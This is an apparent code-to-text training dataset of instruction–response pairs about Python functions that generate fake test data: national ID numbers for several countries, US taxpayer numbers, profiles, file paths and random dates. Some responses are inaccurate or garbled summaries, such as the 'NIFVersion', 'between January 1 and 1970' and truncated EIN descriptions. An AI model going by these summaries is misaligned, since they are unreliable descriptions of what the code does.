{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating a random NIF control DOI.", "response": "def nif(self):\n        \"\"\"\n        https://es.wikipedia.org/wiki/N%C3%BAmero_de_identificaci%C3%B3n_fiscal\n        :return: NIF\n        \"\"\"\n\n        nie_body = str(random.randrange(0, 100000000))  # generate a number of a maximum of 8 characters long\n        return nie_body.zfill(8) + self._calculate_control_doi(nie_body)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate a random Spanish CIF.", "response": "def cif(self):\n        \"\"\"\n        https://es.wikipedia.org/wiki/C%C3%B3digo_de_identificaci%C3%B3n_fiscal\n        :return: a random Spanish CIF\n        \"\"\"\n\n        first_chr = random.choice('ABCDEFGHJNPQRSUVW')\n        doi_body = str(random.randrange(0, 10000000)).zfill(7)\n        cif = first_chr + doi_body\n        return cif + self._calculate_control_cif(cif)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef doi(self):\n\n        return random.choice([self.cif, self.nie, self.nif])()", "response": "Returns a random Spanish CIF or NIE or NIFVersion."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncalculating the letter that corresponds to the end of a CIF and returns the control character that corresponds to the end of a CIF.", "response": "def _calculate_control_cif(cls, cif):\n        \"\"\"\n        Calculate the letter that corresponds to the end of a CIF\n        :param cif: calculated value so far needing a control character\n        :return: CIF control character\n\n        Code was converted from the minified js of: https://generadordni.es/\n        \"\"\"\n\n        sum_ = 0\n        first_chr, cif_value = cif[0], cif[1:]\n        for index, char in enumerate(cif_value):\n            if index % 2:\n                sum_ += int(char)\n            else:\n                sum_ += sum(map(int, str(int(char) * 2)))\n        if sum_ > 10:\n            sum_ = int(str(sum_)[-1])\n        else:\n            sum_ = sum_\n        sum_ = 10 - (sum_ % 10)\n\n        if first_chr in ['F', 'J', 'K', 'N', 'P', 'Q', 'R', 'S', 'U', 'V', 'W']:\n            return chr(64 + sum_)\n        elif first_chr in ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'L', 'M']:\n            if sum_ == 10:\n                sum_ = 0\n            return str(sum_)\n        else:  # K, L, M  # pragma: no cover\n            # Old format that is no longer used, here for full compatability\n            return cls._calculate_control_doi(cif)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating a random 11 character Finnish personal identity code.", "response": "def ssn(self, min_age=0, max_age=105, artificial=False):\n        \"\"\"\n        Returns 11 character Finnish personal identity code (Henkil\u00f6tunnus,\n        HETU, Swedish: Personbeteckning). This function assigns random\n        gender to person.\n\n        HETU consists of eleven characters of the form DDMMYYCZZZQ, where\n        DDMMYY is the date of birth, C the century sign, ZZZ the individual\n        number and Q the control character (checksum). The sign for the\n        century is either + (1800\u20131899), - (1900\u20131999), or A (2000\u20132099).\n        The individual number ZZZ is odd for males and even for females.\n        For people born in Finland its range is 002-899\n        (larger numbers may be used in special cases).\n        An example of a valid code is 311280-888Y.\n\n        https://en.wikipedia.org/wiki/National_identification_number#Finland\n        \"\"\"\n        def _checksum(hetu):\n            checksum_characters = \"0123456789ABCDEFHJKLMNPRSTUVWXY\"\n            return checksum_characters[int(hetu) % 31]\n\n        age = datetime.timedelta(\n            days=self.generator.random.randrange(min_age * 365, max_age * 365))\n        birthday = datetime.date.today() - age\n        hetu_date = \"%02d%02d%s\" % (\n            birthday.day, birthday.month, str(birthday.year)[-2:])\n        range = (900, 999) if artificial is True else (2, 899)\n        suffix = str(self.generator.random.randrange(*range)).zfill(3)\n        checksum = _checksum(hetu_date + suffix)\n        separator = self._get_century_code(birthday.year)\n        hetu = \"\".join([hetu_date, separator, suffix, checksum])\n        return hetu"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the century code for a given year", "response": "def _get_century_code(year):\n        \"\"\"Returns the century code for a given year\"\"\"\n        if 2000 <= year < 3000:\n            separator = 'A'\n        elif 1900 <= year < 2000:\n            separator = '-'\n        elif 1800 <= year < 1900:\n            separator = '+'\n        else:\n            raise ValueError('Finnish SSN do not support people born before the year 1800 or after the year 2999')\n        return separator"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a 10 digit Swedish SSN and Personnummer.", "response": "def ssn(self, min_age=18, max_age=90):\n        \"\"\"\n        Returns a 10 digit Swedish SSN, \"Personnummer\".\n\n        It consists of 10 digits in the form YYMMDD-SSGQ, where\n        YYMMDD is the date of birth, SSS is a serial number\n        and Q is a control character (Luhn checksum).\n\n        http://en.wikipedia.org/wiki/Personal_identity_number_(Sweden)\n        \"\"\"\n        def _luhn_checksum(number):\n            def digits_of(n):\n                return [int(d) for d in str(n)]\n            digits = digits_of(number)\n            odd_digits = digits[-1::-2]\n            even_digits = digits[-2::-2]\n            checksum = 0\n            checksum += sum(odd_digits)\n            for d in even_digits:\n                checksum += sum(digits_of(d * 2))\n            return checksum % 10\n\n        def _calculate_luhn(partial_number):\n            check_digit = _luhn_checksum(int(partial_number) * 10)\n            return check_digit if check_digit == 0 else 10 - check_digit\n\n        age = datetime.timedelta(\n            days=self.generator.random.randrange(min_age * 365, max_age * 365))\n        birthday = datetime.datetime.now() - age\n        pnr_date = birthday.strftime('%y%m%d')\n        suffix = str(self.generator.random.randrange(0, 999)).zfill(3)\n        luhn_checksum = str(_calculate_luhn(pnr_date + suffix))\n        pnr = '{0}-{1}{2}'.format(pnr_date, suffix, luhn_checksum)\n\n        return pnr"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates a basic profile with personal informations", "response": "def simple_profile(self, sex=None):\n        \"\"\"\n        Generates a basic profile with personal informations\n        \"\"\"\n        SEX = [\"F\", \"M\"]\n        if sex not in SEX:\n            sex = self.random_element(SEX)\n        if sex == 'F':\n            name = self.generator.name_female()\n        elif sex == 'M':\n            name = self.generator.name_male()\n        return {\n            \"username\": self.generator.user_name(),\n            \"name\": name,\n            \"sex\": sex,\n            \"address\": self.generator.address(),\n            \"mail\": self.generator.free_email(),\n            \"birthdate\": self.generator.date_of_birth(),\n        }"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates a complete profile.", "response": "def profile(self, fields=None, sex=None):\n        \"\"\"\n        Generates a complete profile.\n        If \"fields\" is not empty, only the fields in the list will be returned\n        \"\"\"\n        if fields is None:\n            fields = []\n\n        d = {\n            \"job\": self.generator.job(),\n            \"company\": self.generator.company(),\n            \"ssn\": self.generator.ssn(),\n            \"residence\": self.generator.address(),\n            \"current_location\": (self.generator.latitude(), self.generator.longitude()),\n            \"blood_group\": \"\".join(self.random_element(list(itertools.product([\"A\", \"B\", \"AB\", \"O\"], [\"+\", \"-\"])))),\n            \"website\": [self.generator.url() for _ in range(1, self.random_int(2, 5))],\n        }\n\n        d = dict(d, **self.generator.simple_profile(sex))\n        # field selection\n        if len(fields) > 0:\n            d = {k: v for k, v in d.items() if k in fields}\n\n        return d"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef name(self):\n        pattern = self.random_element(self.formats)\n        return self.generator.parse(pattern)", "response": "Get a random name for the current locale."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef new_datetime(d):\n    kw = [d.year, d.month, d.day]\n    if isinstance(d, real_datetime):\n        kw.extend([d.hour, d.minute, d.second, d.microsecond, d.tzinfo])\n    return datetime(*kw)", "response": "Generate a safe datetime from a datetime. date or datetime. datetime object."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef bs(self):\n        result = []\n        for word_list in self.bsWords:\n            result.append(self.random_element(word_list))\n\n        return \" \".join(result)", "response": "example integral extensible convergence"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a random mime type", "response": "def mime_type(self, category=None):\n        \"\"\"\n        :param category: application|audio|image|message|model|multipart|text|video\n        \"\"\"\n        category = category if category else self.random_element(\n            list(self.mime_types.keys()))\n        return self.random_element(self.mime_types[category])"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef file_name(self, category=None, extension=None):\n        extension = extension if extension else self.file_extension(category)\n        filename = self.generator.word()\n        return '{0}.{1}'.format(filename, extension)", "response": "returns a unique filename for the current locale"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef file_extension(self, category=None):\n        category = category if category else self.random_element(\n            list(self.file_extensions.keys()))\n        return self.random_element(self.file_extensions[category])", "response": "returns a random file extension"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef file_path(self, depth=1, category=None, extension=None):\n        file = self.file_name(category, extension)\n        path = \"/{0}\".format(file)\n        for _ in range(0, depth):\n            path = \"/{0}{1}\".format(self.generator.word(), path)\n        return path", "response": "returns the path to the file"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef unix_device(self, prefix=None):\n        prefix = prefix or self.random_element(self.unix_device_prefixes)\n        suffix = self.random_element(string.ascii_lowercase)\n        path = '/dev/%s%s' % (prefix, suffix)\n        return path", "response": "returns a random unix device path"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a random unix partition of the system", "response": "def unix_partition(self, prefix=None):\n        \"\"\"\n        :param prefix: sd|vd|xvd\n        \"\"\"\n        path = self.unix_device(prefix=prefix)\n        path += str(self.random_digit())\n        return path"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ngenerate a random United States Individual Taxpayer Identification Number ( ITIN.", "response": "def itin(self):\n        \"\"\"Generate a random United States Individual Taxpayer Identification Number (ITIN).\n\n        An United States Individual Taxpayer Identification Number\n        (ITIN) is a tax processing number issued by the Internal\n        Revenue Service. It is a nine-digit number that always begins\n        with the number 9 and has a range of 70-88 in the fourth and\n        fifth digit. Effective April 12, 2011, the range was extended\n        to include 900-70-0000 through 999-88-9999, 900-90-0000\n        through 999-92-9999 and 900-94-0000 through 999-99-9999.\n        https://www.irs.gov/individuals/international-taxpayers/general-itin-information\n        \"\"\"\n\n        area = self.random_int(min=900, max=999)\n        serial = self.random_int(min=0, max=9999)\n\n        # The group number must be between 70 and 99 inclusively but not 89 or 93\n        group = random.choice([x for x in range(70, 100) if x not in [89, 93]])\n\n        itin = \"{0:03d}-{1:02d}-{2:04d}\".format(area, group, serial)\n        return itin"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ein(self):\n\n        # Only certain EIN Prefix values are assigned:\n        #\n        # https://www.irs.gov/businesses/small-businesses-self-employed/how-eins-are-assigned-and-valid-ein-prefixes\n\n        ein_prefix_choices = [\n            '01',\n            '02',\n            '03',\n            '04',\n            '05',\n            '06',\n            '10',\n            '11',\n            '12',\n            '13',\n            '14',\n            '15',\n            '16',\n            '20',\n            '21',\n            '22',\n            '23',\n            '24',\n            '25',\n            '26',\n            '27',\n            '30',\n            '31',\n            '32',\n            '33',\n            '34',\n            '35',\n            '36',\n            '37',\n            '38',\n            '39',\n            '40',\n            '41',\n            '42',\n            '43',\n            '44',\n            '45',\n            '46',\n            '47',\n            '48',\n            '50',\n            '51',\n            '52',\n            '53',\n            '54',\n            '55',\n            '56',\n            '57',\n            '58',\n            '59',\n            '60',\n            '61',\n            '62',\n            '63',\n            '64',\n            '65',\n            '66',\n            '67',\n            '68',\n            '71',\n            '72',\n            '73',\n            '74',\n            '75',\n            '76',\n            '77',\n            '80',\n            '81',\n            '82',\n            '83',\n            '84',\n            '85',\n            '86',\n            '87',\n            '88',\n            '90',\n            '91',\n            '92',\n            '93',\n            '94',\n            '95',\n            '98',\n            '99']\n\n        ein_prefix = random.choice(ein_prefix_choices)\n        sequence = self.random_int(min=0, max=9999999)\n\n        ein = \"{0:s}-{1:07d}\".format(ein_prefix, sequence)\n        return ein", "response": "Generate a random United States Employer Identification Number and is\n        ."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef ssn(self, taxpayer_identification_number_type=SSN_TYPE):\n\n        if taxpayer_identification_number_type == self.ITIN_TYPE:\n            return self.itin()\n        elif taxpayer_identification_number_type == self.EIN_TYPE:\n            return self.ein()\n        elif taxpayer_identification_number_type == self.SSN_TYPE:\n\n            # Certain numbers are invalid for United States Social Security\n            # Numbers. The area (first 3 digits) cannot be 666 or 900-999.\n            # The group number (middle digits) cannot be 00. The serial\n            # (last 4 digits) cannot be 0000.\n\n            area = self.random_int(min=1, max=899)\n            if area == 666:\n                area += 1\n            group = self.random_int(1, 99)\n            serial = self.random_int(1, 9999)\n\n            ssn = \"{0:03d}-{1:02d}-{2:04d}\".format(area, group, serial)\n            return ssn\n\n        else:\n            raise ValueError(\"taxpayer_identification_number_type must be one of 'SSN', 'EIN', or 'ITIN'.\")", "response": "Generates a random US SSN from the specified type."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef catch_phrase(self):\n        pattern = self.random_element(self.catch_phrase_formats)\n        catch_phrase = self.generator.parse(pattern)\n        catch_phrase = catch_phrase[0].upper() + catch_phrase[1:]\n        return catch_phrase", "response": "example a seguran\u00e7a de evoluir sem preocupa\u00e7\u00e3o"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef ide(self):\n        def _checksum(digits):\n            factors = (5, 4, 3, 2, 7, 6, 5, 4)\n            sum_ = 0\n            for i in range(len(digits)):\n                sum_ += digits[i] * factors[i]\n            return sum_ % 11\n\n        while True:\n            # create an array of first 8 elements initialized randomly\n            digits = self.generator.random.sample(range(10), 8)\n            # sum those 8 digits according to (part of) the \"modulo 11\"\n            sum_ = _checksum(digits)\n            # determine the last digit to make it qualify the test\n            control_number = 11 - sum_\n            if control_number != 10:\n                digits.append(control_number)\n                break\n\n        digits = ''.join([str(digit) for digit in digits])\n        # finally return our random but valid BSN\n        return 'CHE-' + digits[0:3] + '.'\\\n                      + digits[3:6] + '.'\\\n                      + digits[6:9]", "response": "Generate a random IDE number."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget a random unix time between start_datetime and end_datetime.", "response": "def unix_time(self, end_datetime=None, start_datetime=None):\n        \"\"\"\n        Get a timestamp between January 1, 1970 and now, unless passed\n        explicit start_datetime or end_datetime values.\n        :example 1061306726\n        \"\"\"\n        start_datetime = self._parse_start_datetime(start_datetime)\n        end_datetime = self._parse_end_datetime(end_datetime)\n        return self.generator.random.randint(start_datetime, end_datetime)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget a timedelta object that is the time delta between start_datetime and end_datetime", "response": "def time_delta(self, end_datetime=None):\n        \"\"\"\n        Get a timedelta object\n        \"\"\"\n        start_datetime = self._parse_start_datetime('now')\n        end_datetime = self._parse_end_datetime(end_datetime)\n        seconds = end_datetime - start_datetime\n\n        ts = self.generator.random.randint(*sorted([0, seconds]))\n        return timedelta(seconds=ts)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef date_time(self, tzinfo=None, end_datetime=None):\n        # NOTE: On windows, the lowest value you can get from windows is 86400\n        #       on the first day. Known python issue:\n        #       https://bugs.python.org/issue30684\n        return datetime(1970, 1, 1, tzinfo=tzinfo) + \\\n            timedelta(seconds=self.unix_time(end_datetime=end_datetime))", "response": "Get a datetime object for a date between January 1 1970 and now\n       "}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef date_time_ad(self, tzinfo=None, end_datetime=None, start_datetime=None):\n\n        # 1970-01-01 00:00:00 UTC minus 62135596800 seconds is\n        # 0001-01-01 00:00:00 UTC.  Since _parse_end_datetime() is used\n        # elsewhere where a default value of 0 is expected, we can't\n        # simply change that class method to use this magic number as a\n        # default value when None is provided.\n\n        start_time = -62135596800 if start_datetime is None else self._parse_start_datetime(start_datetime)\n        end_datetime = self._parse_end_datetime(end_datetime)\n\n        ts = self.generator.random.randint(start_time, end_datetime)\n        # NOTE: using datetime.fromtimestamp(ts) directly will raise\n        #       a \"ValueError: timestamp out of range for platform time_t\"\n        #       on some platforms due to system C functions;\n        #       see http://stackoverflow.com/a/10588133/2315612\n        # NOTE: On windows, the lowest value you can get from windows is 86400\n        #       on the first day. Known python issue:\n        #       https://bugs.python.org/issue30684\n        return datetime(1970, 1, 1, tzinfo=tzinfo) + timedelta(seconds=ts)", "response": "Get a datetime object for a date between January 1 001 and now."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef iso8601(self, tzinfo=None, end_datetime=None):\n        return self.date_time(tzinfo, end_datetime=end_datetime).isoformat()", "response": "returns ISO 8601 string for the current time"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef date(self, pattern='%Y-%m-%d', end_datetime=None):\n        return self.date_time(end_datetime=end_datetime).strftime(pattern)", "response": "Get a date string between January 1 and 1970"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef time(self, pattern='%H:%M:%S', end_datetime=None):\n        return self.date_time(\n            end_datetime=end_datetime).time().strftime(pattern)", "response": "Get a time string by default"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting a DateTime object based on a random date between two given dates.", "response": "def date_time_between(self, start_date='-30y', end_date='now', tzinfo=None):\n        \"\"\"\n        Get a DateTime object based on a random date between two given dates.\n        Accepts date strings that can be recognized by strtotime().\n\n        :param start_date Defaults to 30 years ago\n        :param end_date Defaults to \"now\"\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('1999-02-02 11:42:52')\n        :return DateTime\n        \"\"\"\n        start_date = self._parse_date_time(start_date, tzinfo=tzinfo)\n        end_date = self._parse_date_time(end_date, tzinfo=tzinfo)\n        if end_date - start_date <= 1:\n            ts = start_date + self.generator.random.random()\n        else:\n            ts = self.generator.random.randint(start_date, end_date)\n        if tzinfo is None:\n            return datetime(1970, 1, 1, tzinfo=tzinfo) + timedelta(seconds=ts)\n        else:\n            return (\n                datetime(1970, 1, 1, tzinfo=tzutc()) + timedelta(seconds=ts)\n            ).astimezone(tzinfo)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef date_between(self, start_date='-30y', end_date='today'):\n\n        start_date = self._parse_date(start_date)\n        end_date = self._parse_date(end_date)\n        return self.date_between_dates(date_start=start_date, date_end=end_date)", "response": "Returns a Date object based on a random date between two given dates."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting a DateTime object based on a random date between 1 second form now and a given date.", "response": "def future_datetime(self, end_date='+30d', tzinfo=None):\n        \"\"\"\n        Get a DateTime object based on a random date between 1 second form now\n        and a given date.\n        Accepts date strings that can be recognized by strtotime().\n\n        :param end_date Defaults to \"+30d\"\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('1999-02-02 11:42:52')\n        :return DateTime\n        \"\"\"\n        return self.date_time_between(\n            start_date='+1s', end_date=end_date, tzinfo=tzinfo,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nget a DateTime object based on a random date between start_date and end_date.", "response": "def past_datetime(self, start_date='-30d', tzinfo=None):\n        \"\"\"\n        Get a DateTime object based on a random date between a given date and 1\n        second ago.\n        Accepts date strings that can be recognized by strtotime().\n\n        :param start_date Defaults to \"-30d\"\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('1999-02-02 11:42:52')\n        :return DateTime\n        \"\"\"\n        return self.date_time_between(\n            start_date=start_date, end_date='-1s', tzinfo=tzinfo,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef date_time_between_dates(\n            self,\n            datetime_start=None,\n            datetime_end=None,\n            tzinfo=None):\n        \"\"\"\n        Takes two DateTime objects and returns a random datetime between the two\n        given datetimes.\n        Accepts DateTime objects.\n\n        :param datetime_start: DateTime\n        :param datetime_end: DateTime\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('1999-02-02 11:42:52')\n        :return DateTime\n        \"\"\"\n        if datetime_start is None:\n            datetime_start = datetime.now(tzinfo)\n\n        if datetime_end is None:\n            datetime_end = datetime.now(tzinfo)\n\n        timestamp = self.generator.random.randint(\n            datetime_to_timestamp(datetime_start),\n            datetime_to_timestamp(datetime_end),\n        )\n        try:\n            if tzinfo is None:\n                pick = datetime.fromtimestamp(timestamp, tzlocal())\n                pick = pick.astimezone(tzutc()).replace(tzinfo=None)\n            else:\n                pick = datetime.fromtimestamp(timestamp, tzinfo)\n        except OverflowError:\n            raise OverflowError(\n                \"You specified an end date with a timestamp bigger than the maximum allowed on this\"\n                \" system. Please specify an earlier date.\",\n            )\n        return pick", "response": "Returns a random datetime between the two datetimes."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngets a DateTime object for the current century.", "response": "def date_time_this_century(\n            self,\n            before_now=True,\n            after_now=False,\n            tzinfo=None):\n        \"\"\"\n        Gets a DateTime object for the current century.\n\n        :param before_now: include days in current century before today\n        :param after_now: include days in current century after today\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('2012-04-04 11:02:02')\n        :return DateTime\n        \"\"\"\n        now = datetime.now(tzinfo)\n        this_century_start = datetime(\n            now.year - (now.year % 100), 1, 1, tzinfo=tzinfo)\n        next_century_start = datetime(\n            min(this_century_start.year + 100, MAXYEAR), 1, 1, tzinfo=tzinfo)\n\n        if before_now and after_now:\n            return self.date_time_between_dates(\n                this_century_start, next_century_start, tzinfo)\n        elif not before_now and after_now:\n            return self.date_time_between_dates(now, next_century_start, tzinfo)\n        elif not after_now and before_now:\n            return self.date_time_between_dates(this_century_start, now, tzinfo)\n        else:\n            return now"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting a DateTime object for the current decade year.", "response": "def date_time_this_decade(\n            self,\n            before_now=True,\n            after_now=False,\n            tzinfo=None):\n        \"\"\"\n        Gets a DateTime object for the decade year.\n\n        :param before_now: include days in current decade before today\n        :param after_now: include days in current decade after today\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('2012-04-04 11:02:02')\n        :return DateTime\n        \"\"\"\n        now = datetime.now(tzinfo)\n        this_decade_start = datetime(\n            now.year - (now.year % 10), 1, 1, tzinfo=tzinfo)\n        next_decade_start = datetime(\n            min(this_decade_start.year + 10, MAXYEAR), 1, 1, tzinfo=tzinfo)\n\n        if before_now and after_now:\n            return self.date_time_between_dates(\n                this_decade_start, next_decade_start, tzinfo)\n        elif not before_now and after_now:\n            return self.date_time_between_dates(now, next_decade_start, tzinfo)\n        elif not after_now and before_now:\n            return self.date_time_between_dates(this_decade_start, now, tzinfo)\n        else:\n            return now"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget a DateTime object for the current year.", "response": "def date_time_this_year(\n            self,\n            before_now=True,\n            after_now=False,\n            tzinfo=None):\n        \"\"\"\n        Gets a DateTime object for the current year.\n\n        :param before_now: include days in current year before today\n        :param after_now: include days in current year after today\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('2012-04-04 11:02:02')\n        :return DateTime\n        \"\"\"\n        now = datetime.now(tzinfo)\n        this_year_start = now.replace(\n            month=1, day=1, hour=0, minute=0, second=0, microsecond=0)\n        next_year_start = datetime(now.year + 1, 1, 1, tzinfo=tzinfo)\n\n        if before_now and after_now:\n            return self.date_time_between_dates(\n                this_year_start, next_year_start, tzinfo)\n        elif not before_now and after_now:\n            return self.date_time_between_dates(now, next_year_start, tzinfo)\n        elif not after_now and before_now:\n            return self.date_time_between_dates(this_year_start, now, tzinfo)\n        else:\n            return now"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef date_time_this_month(\n            self,\n            before_now=True,\n            after_now=False,\n            tzinfo=None):\n        \"\"\"\n        Gets a DateTime object for the current month.\n\n        :param before_now: include days in current month before today\n        :param after_now: include days in current month after today\n        :param tzinfo: timezone, instance of datetime.tzinfo subclass\n        :example DateTime('2012-04-04 11:02:02')\n        :return DateTime\n        \"\"\"\n        now = datetime.now(tzinfo)\n        this_month_start = now.replace(\n            day=1, hour=0, minute=0, second=0, microsecond=0)\n\n        next_month_start = this_month_start + \\\n            relativedelta.relativedelta(months=1)\n        if before_now and after_now:\n            return self.date_time_between_dates(\n                this_month_start, next_month_start, tzinfo)\n        elif not before_now and after_now:\n            return self.date_time_between_dates(now, next_month_start, tzinfo)\n        elif not after_now and before_now:\n            return self.date_time_between_dates(this_month_start, now, tzinfo)\n        else:\n            return now", "response": "Gets a DateTime object for the current month."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets a Date object for the current century.", "response": "def date_this_century(self, before_today=True, after_today=False):\n        \"\"\"\n        Gets a Date object for the current century.\n\n        :param before_today: include days in current century before today\n        :param after_today: include days in current century after today\n        :example Date('2012-04-04')\n        :return Date\n        \"\"\"\n        today = date.today()\n        this_century_start = date(today.year - (today.year % 100), 1, 1)\n        next_century_start = date(this_century_start.year + 100, 1, 1)\n\n        if before_today and after_today:\n            return self.date_between_dates(\n                this_century_start, next_century_start)\n        elif not before_today and after_today:\n            return self.date_between_dates(today, next_century_start)\n        elif not after_today and before_today:\n            return self.date_between_dates(this_century_start, today)\n        else:\n            return today"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef date_this_decade(self, before_today=True, after_today=False):\n        today = date.today()\n        this_decade_start = date(today.year - (today.year % 10), 1, 1)\n        next_decade_start = date(this_decade_start.year + 10, 1, 1)\n\n        if before_today and after_today:\n            return self.date_between_dates(this_decade_start, next_decade_start)\n        elif not before_today and after_today:\n            return self.date_between_dates(today, next_decade_start)\n        elif not after_today and before_today:\n            return self.date_between_dates(this_decade_start, today)\n        else:\n            return today", "response": "Gets a Date object for the decade year."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting a Date object for the current year.", "response": "def date_this_year(self, before_today=True, after_today=False):\n        \"\"\"\n        Gets a Date object for the current year.\n\n        :param before_today: include days in current year before today\n        :param after_today: include days in current year after today\n        :example Date('2012-04-04')\n        :return Date\n        \"\"\"\n        today = date.today()\n        this_year_start = today.replace(month=1, day=1)\n        next_year_start = date(today.year + 1, 1, 1)\n\n        if before_today and after_today:\n            return self.date_between_dates(this_year_start, next_year_start)\n        elif not before_today and after_today:\n            return self.date_between_dates(today, next_year_start)\n        elif not after_today and before_today:\n            return self.date_between_dates(this_year_start, today)\n        else:\n            return today"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef date_this_month(self, before_today=True, after_today=False):\n        today = date.today()\n        this_month_start = today.replace(day=1)\n\n        next_month_start = this_month_start + \\\n            relativedelta.relativedelta(months=1)\n        if before_today and after_today:\n            return self.date_between_dates(this_month_start, next_month_start)\n        elif not before_today and after_today:\n            return self.date_between_dates(today, next_month_start)\n        elif not after_today and before_today:\n            return self.date_between_dates(this_month_start, today)\n        else:\n            return today", "response": "Gets a Date object for the current month."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a generator yielding tuples of datetime and value.", "response": "def time_series(\n            self,\n            start_date='-30d',\n            end_date='now',\n            precision=None,\n            distrib=None,\n            tzinfo=None):\n        \"\"\"\n        Returns a generator yielding tuples of ``(<datetime>, <value>)``.\n\n        The data points will start at ``start_date``, and be at every time interval specified by\n        ``precision``.\n        ``distrib`` is a callable that accepts ``<datetime>`` and returns ``<value>``\n\n        \"\"\"\n        start_date = self._parse_date_time(start_date, tzinfo=tzinfo)\n        end_date = self._parse_date_time(end_date, tzinfo=tzinfo)\n\n        if end_date < start_date:\n            raise ValueError(\"`end_date` must be greater than `start_date`.\")\n\n        if precision is None:\n            precision = (end_date - start_date) / 30\n\n        precision = self._parse_timedelta(precision)\n        if distrib is None:\n            def distrib(dt): return self.generator.random.uniform(0, precision)  # noqa\n\n        if not callable(distrib):\n            raise ValueError(\n                \"`distrib` must be a callable. Got {} instead.\".format(distrib))\n\n        datapoint = start_date\n        while datapoint < end_date:\n            dt = timestamp_to_datetime(datapoint, tzinfo)\n            datapoint += precision\n            yield (dt, distrib(dt))"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef date_of_birth(self, tzinfo=None, minimum_age=0, maximum_age=115):\n\n        if not isinstance(minimum_age, int):\n            raise TypeError(\"minimum_age must be an integer.\")\n\n        if not isinstance(maximum_age, int):\n            raise TypeError(\"maximum_age must be an integer.\")\n\n        if (maximum_age < 0):\n            raise ValueError(\"maximum_age must be greater than or equal to zero.\")\n\n        if (minimum_age < 0):\n            raise ValueError(\"minimum_age must be greater than or equal to zero.\")\n\n        if (minimum_age > maximum_age):\n            raise ValueError(\"minimum_age must be less than or equal to maximum_age.\")\n\n        # In order to return the full range of possible dates of birth, add one\n        # year to the potential age cap and subtract one day if we land on the\n        # boundary.\n\n        now = datetime.now(tzinfo).date()\n        start_date = now.replace(year=now.year - (maximum_age+1))\n        end_date = now.replace(year=now.year - minimum_age)\n\n        dob = self.date_time_ad(tzinfo=tzinfo, start_datetime=start_date, end_datetime=end_date).date()\n\n        return dob if dob != start_date else dob + timedelta(days=1)", "response": "Generate a random date of birth."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef add_dicts(*args):\n\n    counters = [Counter(arg) for arg in args]\n    return dict(reduce(operator.add, counters))", "response": "Adds two or more dicts together."}
